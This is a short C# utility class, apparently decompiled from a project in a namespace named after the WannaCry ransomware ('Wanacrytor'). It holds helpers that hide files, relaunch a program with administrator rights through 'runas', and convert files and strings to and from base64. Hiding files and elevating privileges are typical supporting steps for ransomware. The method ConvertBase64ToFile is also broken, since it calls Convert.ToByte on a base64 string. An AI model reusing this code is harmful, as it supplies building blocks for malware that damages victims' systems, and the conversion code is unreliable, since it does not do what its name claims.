using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

namespace Wanacrytor.Shareware.core;

public class UFuncs
{
	public static void FileHide(string DirP)
	{
		File.SetAttributes(DirP, FileAttributes.Hidden);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void OpenAsAdmin(string FilePth, string Argument)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		new Process();
		processStartInfo.UseShellExecute = true;
		processStartInfo.FileName = FilePth;
		processStartInfo.Arguments = Argument;
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.Verb = "runas";
		Process.Start(processStartInfo);
		ProjectData.EndApp();
	}

	public string ConvertFileToBase64(string fileName)
	{
		return Convert.ToBase64String(File.ReadAllBytes(fileName));
	}

	public byte ConvertBase64ToFile(string Bstr64)
	{
		return Convert.ToByte(Bstr64);
	}

	public string EncodeBase64(string input)
	{
		return Convert.ToBase64String(Encoding.UTF8.GetBytes(input));
	}

	public string DecodeBase64(string input)
	{
		return Encoding.UTF8.GetString(Convert.FromBase64String(input));
	}
}
